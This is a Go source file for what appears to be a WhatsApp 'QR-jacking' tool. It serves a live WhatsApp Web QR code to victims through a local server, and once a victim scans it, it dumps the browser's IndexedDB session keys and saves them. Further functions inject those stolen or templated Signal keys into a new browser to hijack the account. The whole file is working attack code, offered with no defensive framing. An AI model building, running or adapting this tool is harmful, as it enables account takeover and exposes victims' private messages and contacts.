package whatsapp

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/chromedp/cdproto/runtime"
	"github.com/chromedp/chromedp"

	"programa/utils"
)

func sudoFixEnv() {
	if os.Getuid() != 0 {
		return
	}
	sudoUID := os.Getenv("SUDO_UID")
	if sudoUID == "" {
		return
	}
	runtimeDir := fmt.Sprintf("/run/user/%s", sudoUID)
	if _, err := os.Stat(runtimeDir); err == nil {
		os.Setenv("XDG_RUNTIME_DIR", runtimeDir)
	}
	if os.Getenv("WAYLAND_DISPLAY") == "" {
		entries, err := os.ReadDir(runtimeDir)
		if err == nil {
			for _, e := range entries {
				if !e.IsDir() && strings.HasPrefix(e.Name(), "wayland-") {
					os.Setenv("WAYLAND_DISPLAY", e.Name())
					break
				}
			}
		}
	}
}

func startChrome(ctx context.Context, userDir string) (context.Context, context.CancelFunc, context.CancelFunc, error) {
	opts := []chromedp.ExecAllocatorOption{
		chromedp.NoSandbox,
		chromedp.Flag("disable-gpu", true),
		chromedp.Flag("ozone-platform", "wayland"),
		chromedp.NoFirstRun,
		chromedp.NoDefaultBrowserCheck,
		chromedp.UserDataDir(userDir),
		chromedp.WindowSize(1280, 900),
	}
	allocCtx, allocCancel := chromedp.NewExecAllocator(ctx, opts...)
	ctx2, cancel := chromedp.NewContext(allocCtx)
	return ctx2, cancel, allocCancel, nil
}

func launchChromeAttack(cfg attackCfg) {
	os.MkdirAll(sessionsDir, 0755)

	ctx, cancel := context.WithCancel(context.Background())

	srvSt.mu.Lock()
	srvSt.stop = cancel
	srvSt.running = true
	srvSt.sessionCnt = 0
	srvSt.lastSession = ""
	ip := utils.GetLocalIP()
	srvSt.url = fmt.Sprintf("http://%s:%d", ip, cfg.Port)
	srvSt.mu.Unlock()

	mux := http.NewServeMux()
	mux.HandleFunc("/", verifyHandler)
	mux.HandleFunc("/qr", qrPageHandler)
	mux.HandleFunc("/qr-image", qrImageHandler)
	mux.HandleFunc("/qr-status", qrStatusHandler)

	addr := fmt.Sprintf("%s:%d", cfg.Host, cfg.Port)
	listener, err := net.Listen("tcp", addr)
	if err != nil {
		listener, err = net.Listen("tcp", ":0")
		if err != nil {
			srvSt.mu.Lock()
			srvSt.running = false
			srvSt.mu.Unlock()
			return
		}
	}
	actualAddr := listener.Addr().String()
	cfg.Host, cfg.Port = parseAddr(actualAddr)
	ip = utils.GetLocalIP()
	srvSt.mu.Lock()
	srvSt.url = fmt.Sprintf("http://%s:%d", ip, cfg.Port)
	srvSt.mu.Unlock()

	srv := &http.Server{Handler: mux}
	go srv.Serve(listener)

	os.Unsetenv("DISPLAY")
	sudoFixEnv()

	for {
		select {
		case <-ctx.Done():
			srv.Close()
			srvSt.mu.Lock()
			srvSt.running = false
			srvSt.mu.Unlock()
			return
		default:
		}

		userDir, err := os.MkdirTemp("", "whatsapp-chrome-*")
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}

		attackSt.mu.Lock()
		attackSt.qrCode = ""
		attackSt.qrImage = nil
		attackSt.errorMsg = ""
		attackSt.paired = false
		attackSt.mu.Unlock()

		browserCtx, browserCancel, allocCancel, err := startChrome(ctx, userDir)
		if err != nil {
			os.RemoveAll(userDir)
			time.Sleep(2 * time.Second)
			continue
		}

		if err := chromedp.Run(browserCtx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
			browserCancel()
			allocCancel()
			os.RemoveAll(userDir)
			time.Sleep(2 * time.Second)
			continue
		}
		if err := chromedp.Run(browserCtx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
			browserCancel()
			allocCancel()
			os.RemoveAll(userDir)
			time.Sleep(2 * time.Second)
			continue
		}

		done := make(chan struct{})
		var closeOnce sync.Once

		go func() {
			for {
				select {
				case <-done:
					return
				case <-time.After(2 * time.Second):
				}

				var hasCanvas bool
				_ = chromedp.Run(browserCtx, chromedp.Evaluate(`!!document.querySelector('canvas')`, &hasCanvas))
				if !hasCanvas {
					attackSt.mu.Lock()
					attackSt.paired = true
					attackSt.mu.Unlock()
					closeOnce.Do(func() { close(done) })
					return
				}

				var dataURL string
				err := chromedp.Run(browserCtx, chromedp.Evaluate(
					`document.querySelector('canvas').toDataURL('image/png')`,
					&dataURL,
					func(p *runtime.EvaluateParams) *runtime.EvaluateParams {
						return p.WithAwaitPromise(true)
					},
				))
				if err == nil && len(dataURL) > 22 {
					b64 := dataURL[22:]
					imgData, decErr := base64.StdEncoding.DecodeString(b64)
					if decErr == nil {
						attackSt.mu.Lock()
						attackSt.qrImage = imgData
						attackSt.qrCode = "active"
						attackSt.mu.Unlock()
					}
				}
			}
		}()

		select {
		case <-done:
			time.Sleep(3 * time.Second)
			saveChromeSession(browserCtx, userDir)
			browserCancel()
			allocCancel()
			os.RemoveAll(userDir)

			srvSt.mu.Lock()
			srvSt.sessionCnt++
			srvSt.mu.Unlock()
			atomic.StoreInt32(&newSessionNote, 1)

		case <-time.After(120 * time.Second):
			closeOnce.Do(func() { close(done) })
			browserCancel()
			allocCancel()
			os.RemoveAll(userDir)
			time.Sleep(2 * time.Second)
			continue

		case <-ctx.Done():
			closeOnce.Do(func() { close(done) })
			browserCancel()
			allocCancel()
			os.RemoveAll(userDir)
		}
	}
}

func saveChromeSession(browserCtx context.Context, userDir string) {
	ts := time.Now().Format("2006-01-02_15-04-05")
	sessionDir := filepath.Join(sessionsDir, ts)
	os.MkdirAll(sessionDir, 0755)

	indexPath := filepath.Join(sessionDir, "indexeddb.json")
	dumpDB(browserCtx, indexPath)

	sd := sessionData{Timestamp: ts}
	jsonData, _ := json.MarshalIndent(sd, "", "  ")
	sessionFile := filepath.Join(sessionDir, "session.json")
	os.WriteFile(sessionFile, jsonData, 0644)

	sessions := loadSessions()
	id := fmt.Sprintf("%d", len(sessions))
	sessions[id] = sessionMeta{
		ID:        id,
		Timestamp: ts,
		Browser:   "chrome",
		Profile:   sessionDir,
		URL:       "-",
	}
	saveSessions(sessions)
}

func DiscoverReferenceProfile(outDir string) error {
	os.Unsetenv("DISPLAY")
	sudoFixEnv()

	if err := os.MkdirAll(outDir, 0755); err != nil {
		return err
	}
	userDir, err := os.MkdirTemp("", "whatsapp-ref-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(userDir)

	ctx, cancel, allocCancel, err := startChrome(context.Background(), userDir)
	if err != nil {
		return err
	}
	defer cancel()
	defer allocCancel()

	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return err
	}

	fmt.Println("\n============================================")
	fmt.Println("  WHATSAPP WEB - REFERENCE PAIRING")
	fmt.Println("============================================")
	fmt.Println("  Chromium opened. Scan QR with your phone.")
	fmt.Println("============================================")

	if err := chromedp.Run(ctx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
		return fmt.Errorf("wait QR: %w", err)
	}
	time.Sleep(2 * time.Second)
	dumpDB(ctx, filepath.Join(outDir, "pre_pairing.json"))

	fmt.Println("\n[*] Waiting for pairing (up to 2 min)...")
	pc, pcCancel := context.WithTimeout(ctx, 120*time.Second)
	defer pcCancel()
	if err := chromedp.Run(pc, chromedp.WaitNotPresent("canvas", chromedp.ByQuery)); err != nil {
		fmt.Println("[!] Timed out. Make sure you scanned the QR code.")
		return nil
	}
	time.Sleep(3 * time.Second)

	dumpDB(ctx, filepath.Join(outDir, "post_pairing.json"))
	fmt.Printf("\n[+] Saved to %s\n", outDir)
	return nil
}

const jsDump = `
(async () => {
  const dbs = await indexedDB.databases(), out = [];
  for (const info of dbs) {
    const db = await new Promise((res, rej) => { const r = indexedDB.open(info.name); r.onsuccess = e => res(e.target.result); r.onerror = e => rej(e.target.error); });
    const dbInfo = {name: info.name, version: info.version, stores: []};
    for (const sn of db.objectStoreNames) {
      const tx = db.transaction(sn, 'readonly'), st = tx.objectStore(sn);
      const values = await new Promise((res, rej) => { const r = st.getAll(); r.onsuccess = e => res(e.target.result); r.onerror = e => rej(e.target.error); });
      const keys   = await new Promise((res, rej) => { const r = st.getAllKeys(); r.onsuccess = e => res(e.target.result); r.onerror = e => rej(e.target.error); });
      const si = {name: sn, entries: []};
      for (let i = 0; i < values.length; i++) si.entries.push({k: keys[i], v: s(values[i])});
      dbInfo.stores.push(si);
    }
    out.push(dbInfo); db.close();
  }
  return JSON.stringify(out);
  function s(v) {
    if (v === null || v === undefined) return v;
    if (typeof v === 'number' || typeof v === 'string' || typeof v === 'boolean') return v;
    if (v instanceof ArrayBuffer) return {_b: Array.from(new Uint8Array(v))};
    if (ArrayBuffer.isView(v)) return {_b: Array.from(new Uint8Array(v.buffer, v.byteOffset, v.byteLength))};
    if (Array.isArray(v)) return v.map(s);
    const o = {};
    for (const k of Object.getOwnPropertyNames(v)) o[k] = s(v[k]);
    return o;
  }
})()`

func dumpDB(ctx context.Context, path string) {
	r, err := evalDump(ctx)
	if err != nil {
		fmt.Printf("  dump failed: %v\n", err)
		return
	}
	var v interface{}
	json.Unmarshal([]byte(r), &v)
	data, _ := json.MarshalIndent(v, "", "  ")
	os.WriteFile(path, data, 0644)
	fmt.Printf("  Saved: %s (%d bytes)\n", filepath.Base(path), len(data))
}

func evalDump(ctx context.Context) (string, error) {
	var r string
	if err := chromedp.Run(ctx, chromedp.Evaluate(jsDump, &r, func(p *runtime.EvaluateParams) *runtime.EvaluateParams {
		return p.WithAwaitPromise(true)
	})); err != nil {
		return "", err
	}
	return r, nil
}

func injectIndexedDB(ctx context.Context, jsonData []byte) error {
	injectJS := genTemplateInjectJS(string(jsonData))
	var result string
	if err := chromedp.Run(ctx, chromedp.Evaluate(injectJS, &result, func(p *runtime.EvaluateParams) *runtime.EvaluateParams {
		return p.WithAwaitPromise(true)
	})); err != nil {
		return fmt.Errorf("inject: %w", err)
	}
	fmt.Printf("[+] %s\n", result)
	return nil
}

func ReplayChromeSession(profileDir string) error {
	os.Unsetenv("DISPLAY")
	sudoFixEnv()

	indexedDBData, err := os.ReadFile(filepath.Join(profileDir, "indexeddb.json"))
	if err != nil {
		return fmt.Errorf("load indexeddb dump: %w", err)
	}

	userDir, err := os.MkdirTemp("", "whatsapp-replay-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(userDir)

	ctx, cancel, allocCancel, err := startChrome(context.Background(), userDir)
	if err != nil {
		return err
	}
	defer cancel()
	defer allocCancel()

	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return err
	}
	if err := chromedp.Run(ctx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
		return fmt.Errorf("wait QR: %w", err)
	}
	time.Sleep(2 * time.Second)

	if err := injectIndexedDB(ctx, indexedDBData); err != nil {
		return err
	}

	if err := chromedp.Run(ctx, chromedp.Reload()); err != nil {
		return err
	}
	fmt.Println("[+] WhatsApp Web opened. Press Enter to disconnect.")
	fmt.Scanln()
	return nil
}

func ReplayInBrowser(sd *sessionData) error {
	os.Unsetenv("DISPLAY")
	sudoFixEnv()

	templateData, err := os.ReadFile("scripts/qr_jacker/whatsapp/reference/post_pairing.json")
	if err != nil {
		return fmt.Errorf("load reference template: %w", err)
	}

	var template interface{}
	if err := json.Unmarshal(templateData, &template); err != nil {
		return fmt.Errorf("parse reference template: %w", err)
	}

	replaceKeysInTemplate(template, sd)

	modifiedTemplate, err := json.Marshal(template)
	if err != nil {
		return fmt.Errorf("serialize modified template: %w", err)
	}

	userDir, err := os.MkdirTemp("", "whatsapp-replay-*")
	if err != nil {
		return err
	}
	defer os.RemoveAll(userDir)

	ctx, cancel, allocCancel, err := startChrome(context.Background(), userDir)
	if err != nil {
		return err
	}
	defer cancel()
	defer allocCancel()

	if err := chromedp.Run(ctx, chromedp.Navigate("https://web.whatsapp.com")); err != nil {
		return err
	}
	if err := chromedp.Run(ctx, chromedp.WaitVisible("canvas", chromedp.ByQuery)); err != nil {
		return fmt.Errorf("wait QR: %w", err)
	}
	time.Sleep(2 * time.Second)

	if err := injectIndexedDB(ctx, modifiedTemplate); err != nil {
		return err
	}

	if err := chromedp.Run(ctx, chromedp.Reload()); err != nil {
		return err
	}
	fmt.Println("[+] WhatsApp Web opened. Press Enter to disconnect.")
	fmt.Scanln()
	return nil
}

func replaceKeysInTemplate(t interface{}, sd *sessionData) {
	dbs, ok := t.([]interface{})
	if !ok {
		return
	}
	advB64 := base64.StdEncoding.EncodeToString(sd.AdvSecretKey)

	for _, dbi := range dbs {
		db, ok := dbi.(map[string]interface{})
		if !ok {
			continue
		}
		stores, _ := db["stores"].([]interface{})

		for _, si := range stores {
			s, ok := si.(map[string]interface{})
			if !ok {
				continue
			}
			name, _ := s["name"].(string)
			entries, _ := s["entries"].([]interface{})

			switch name {
			case "signal-meta-store":
				for _, ei := range entries {
					e, ok := ei.(map[string]interface{})
					if !ok {
						continue
					}
					v, _ := e["v"].(map[string]interface{})
					if v == nil {
						continue
					}
					keyName, _ := v["key"].(string)
					switch keyName {
					case "signal_static_privkey":
						setNestedBytes(v, sd.NoisePriv, "value", "value")
					case "signal_static_pubkey":
						setNestedBytes(v, sd.NoisePub, "value", "value")
					case "signal_reg_id":
						v["value"] = float64(sd.RegistrationID)
					}
				}

			case "signed-prekey-store":
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					v, _ := e["v"].(map[string]interface{})
					if v == nil {
						continue
					}
					v["keyId"] = float64(sd.SignedPreKeyID)
					if kp, _ := v["keyPair"].(map[string]interface{}); kp != nil {
						kp["privKey"] = bytesToBJSON(sd.SignedPrePriv)
						kp["pubKey"] = bytesToBJSON(sd.SignedPrePub)
					}
					v["signature"] = bytesToBJSON(sd.SignedPreSig)
				}

			case "user-prefs":
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					v, _ := e["v"].(map[string]interface{})
					if v == nil {
						continue
					}
					if keyName, _ := v["key"].(string); keyName == "WAADVSecretKey" {
						v["value"] = advB64
					}
				}

			case "identity-store":
				ownJID := fmt.Sprintf("%s@lid.0", sd.JIDUser)
				found := false
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					if k, _ := e["k"].(string); k == ownJID {
						v, _ := e["v"].(map[string]interface{})
						if v != nil {
							v["identifier"] = ownJID
							ik := append([]byte{5}, sd.IdentityPub...)
							v["identityKey"] = bytesToBJSON(ik)
							found = true
						}
						break
					}
				}
				if !found {
					ik := append([]byte{5}, sd.IdentityPub...)
					entries = append(entries, map[string]interface{}{
						"k": ownJID,
						"v": map[string]interface{}{
							"identifier":   ownJID,
							"identityKey": bytesToBJSON(ik),
						},
					})
					s["entries"] = entries
				}

			case "session-store":
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					v, _ := e["v"].(map[string]interface{})
					if v == nil {
						continue
					}
					ownJID := fmt.Sprintf("%s@lid.0", sd.JIDUser)
					e["k"] = ownJID
					v["address"] = ownJID
				}

			case "device-list":
				for _, ei := range entries {
					e, _ := ei.(map[string]interface{})
					if e == nil {
						continue
					}
					k, _ := e["k"].(string)
					if strings.Contains(k, "@lid") {
						parts := strings.SplitN(k, "@", 2)
						if len(parts) == 2 {
							e["k"] = fmt.Sprintf("%s@%s", sd.JIDUser, parts[1])
						}
					}
					if v, _ := e["v"].(map[string]interface{}); v != nil {
						replaceJIDInValue(v, sd.JIDUser)
					}
				}
			}
		}
	}
}

func setNestedBytes(v map[string]interface{}, data []byte, keys ...string) {
	current := v
	for i, k := range keys {
		if i == len(keys)-1 {
			current[k] = bytesToBJSON(data)
			return
		}
		next, _ := current[k].(map[string]interface{})
		if next == nil {
			next = make(map[string]interface{})
			current[k] = next
		}
		current = next
	}
}

func bytesToBJSON(b []byte) map[string]interface{} {
	arr := make([]interface{}, len(b))
	for i, v := range b {
		arr[i] = float64(v)
	}
	return map[string]interface{}{"_b": arr}
}

func replaceJIDInValue(v map[string]interface{}, newJIDUser string) {
	refJIDUser := "256315209330757"
	for key, val := range v {
		if s, ok := val.(string); ok {
			if strings.Contains(s, refJIDUser) {
				v[key] = strings.ReplaceAll(s, refJIDUser, newJIDUser)
			}
		}
	}
}

func genTemplateInjectJS(templateJSON string) string {
	return fmt.Sprintf(`(async()=>{
const T=%s;
function m(v){
  if(v===null||v===undefined)return v;
  if(typeof v==='number'||typeof v==='string'||typeof v==='boolean')return v;
  if(Array.isArray(v))return v.map(m);
  if(v._b!==undefined&&Array.isArray(v._b))return new Uint8Array(v._b);
  const o={};
  for(const k of Object.getOwnPropertyNames(v))o[k]=m(v[k]);
  return o;
}
let r=0;
for(const dbInfo of T){
  const db=await new Promise((res,rej)=>{const r=indexedDB.open(dbInfo.name);r.onsuccess=e=>res(e.target.result);r.onerror=e=>rej(e.target.error)});
  for(const storeInfo of dbInfo.stores){
    const entries=storeInfo.entries;
    if(!entries||!entries.length)continue;
    const tx=db.transaction(storeInfo.name,'readwrite'),st=tx.objectStore(storeInfo.name);
    await new Promise((res,rej)=>{
      const c=st.clear();
      c.onsuccess=async()=>{
        for(const e of entries){
          try{
            const ev=m(e.v);
            await new Promise((r2,rj2)=>{const p=st.put(ev,e.k);p.onsuccess=()=>{r++;r2()};p.onerror=x=>rj2(x.target.error)});
          }catch(x){}
        }
        res();
      };
      c.onerror=e=>{rej(e.target.error)};
    });
  }
  db.close();
}
return "OK: "+r+" entries imported";
})()`, templateJSON)
}
